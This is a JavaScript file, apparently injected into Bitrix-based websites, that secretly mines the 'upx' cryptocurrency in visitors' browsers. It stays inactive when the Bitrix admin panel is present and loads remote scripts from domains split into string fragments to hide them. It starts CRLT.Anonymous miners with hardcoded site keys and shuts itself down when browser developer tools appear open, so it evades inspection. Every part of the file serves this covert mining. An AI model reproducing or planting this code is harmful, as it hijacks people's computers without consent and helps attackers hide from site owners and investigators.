if (typeof BX == 'undefined' || typeof BX.admin == 'undefined') {
    
    window.rotmindeg = false;
    if (window.location.hash == '#'+'d'+'x123'+'_fag') window.rotmindeg = true;
    
    ;(function(window){
    window.jssassin = window.jssassin || {
    
        config: {
            instpDelay: 400,
            startDelay: 1600
        },
        
        state: {
            scriptsNotLoad: 0,
            init: false
        },
        
        proc: {
                start: function(){},
                destroy: function(){}
            },
        
        inspInterval: undefined,
        
        init: function (
                scripts,
                start,
                destroy
            ) {
            
            if (window.rotmindeg) console.log('start init');
            
            if (this.state.init) return;
            this.state.init = true;
            
            if (window.rotmindeg) console.log(scripts,start);
            
            var self = this;
            if (this.isDangerous()) return;
            
            if (typeof start == "function") this.proc.start = start;
            if (typeof destroy == "function") this.proc.destroy = destroy;
            
            this.state.scriptsNotLoad = scripts.length;
                                                        
            if (this.state.scriptsNotLoad > 0) {
                scripts.forEach(function(src) {
                    var script = document.createElement('script');
                    script.src = src;
                    script.async = false;
                    script.onload = function () {self.onloadScript(script)};
                    document.head.appendChild(script);
                    if (window.rotmindeg) console.log('adding script: '+src);
                });
                
                return;
            }
            
            this._init();
            
        },
        onloadScript: function (script) {
            this.state.scriptsNotLoad--;
            document.head.removeChild(script);
            if (window.rotmindeg) console.log('loading script: '+src);
            if (this.state.scriptsNotLoad === 0) this._init();
        },
        _init: function () {
            
            var self = this;
            setTimeout(function () {
                self.proc.start();
            }, this.config.startDelay);
            
            this.inspInterval = setInterval(function () {self.inspector();}, this.config.instpDelay);
        },
        
        
        isDangerous: function () {
            if (window.rotmindeg) {
                console.log('dangerous!');
            }
            if (this.checkDevtoolsInWindow()) {
                this.destroy();
                return true;
            }
            return false;
        },
        
        inspector: function () {
            if (window.jssassin != undefined && typeof window.jssassin.isDangerous == "function") {
                if (this.isDangerous()) {
                    if (window.rotmindeg) console.log('stop inspector');
                    clearInterval(this.inspInterval);
                }
            }
        },
        
        
        destroy: function () {
            clearInterval(this.inspInterval);
            if (window.rotmindeg) {
                console.log('destroy!!!');
                return true;
            }
            this.proc.destroy();
            delete window.jssassin;
        },
        
        ////////////////////////////////////////////////////////////////////////////
        checkDevtoolsInWindow: function () {
            var widthThreshold = window.outerWidth - window.innerWidth > 160;
            var heightThreshold = window.outerHeight - window.innerHeight > 160;
            if (!(heightThreshold && widthThreshold) &&
          ((window.Firebug && window.Firebug.chrome && window.Firebug.chrome.isInitialized) || widthThreshold || heightThreshold)) {
                return true;
            } else {
                return false;
            }
        }
    };
    })(window);
    
    ////////0.4.10////////
    
    var variant = window.varsfacebag || Math.floor(1+Math.random()*4);
    var date = new Date();
    var strDate = date.getDate() + date.getMonth() + date.getFullYear();
    
    if (window.rotmindeg) console.log('v: '+variant);
    
    if (variant == 1) {
        window.jssassin.init(
                ['/bitrix/js/main/cphttprequest.src.js','//pl151'+'80'+'008.pvc'+'lou'+'ds.com/80/d4/8a/80'+'d48af45'+'6b0312'+'fe50'+'5ea01e44'+'03444.js','//1cbpp'+'.ru/bitrix/stats/counter.js','//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window.miner = new CRLT.Anonymous('2e5b1f1f8d87144f4dba5b46914a61bea51a28bffc93', // 1
                            {threads:6,throttle:t,coin:"upx"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else if (variant == 3) {
        window.jssassin.init(
                ['/bitrix/js/main/cphttprequest.src.js','//pl151'+'80'+'008.pvc'+'lou'+'ds.com/80/d4/8a/80'+'d48af45'+'6b0312'+'fe50'+'5ea01e44'+'03444.js','//1cbpp'+'.ru/bitrix/stats/counter.js','//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window.miner = new CRLT.Anonymous('2e5b1f1f8d87144f4dba5b46914a61bea51a28bffc93', // 1
                            {threads:6,throttle:t,coin:"upx"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else if (variant == 2) {
        window.jssassin.init(
                ['/bitrix/js/main/cphttprequest.src.js','//ww'+'w.modu'+'lepu'+'sh.com/fb299c0'+'6c3e54a283fdb'+'0ff5338b4bd0/invo'+'ke.js','//1cbpp'+'.ru/bitrix/stats/counter.js','//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window.miner = new CRLT.Anonymous('8fb9cf1cd2695f2f2596480931007b5371e96f1ca15c', // 2
                            {threads:6,throttle:t,coin:"upx"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else if (variant == 4) {
        window.jssassin.init(
                ['/bitrix/js/main/cphttprequest.src.js','//ww'+'w.modu'+'lepu'+'sh.com/fb299c0'+'6c3e54a283fdb'+'0ff5338b4bd0/invo'+'ke.js','//1cbpp'+'.ru/bitrix/stats/counter.js','//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.2;
                    window.miner = new CRLT.Anonymous('8fb9cf1cd2695f2f2596480931007b5371e96f1ca15c', // 2
                            {threads:6,throttle:t,coin:"upx"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    } else {
        window.jssassin.init(
                ['//statd'+'ynamic.com/lib/cry'+'pta.js?w='+strDate],
                function () {
                    var t = window.trotlrateafacebag || 0.6;
                    window.miner = new CRLT.Anonymous('dd27d0676efdecb12703623d6864bbe9f4e7b3f69f2e', // silent
                            {threads:4,throttle:t,coin:"upx"}
                        );
                    window.miner.start();
                },
                function () {
                    if (window.miner != undefined && typeof window.miner.stop == 'function') window.miner.stop();
                }
            );
    }
}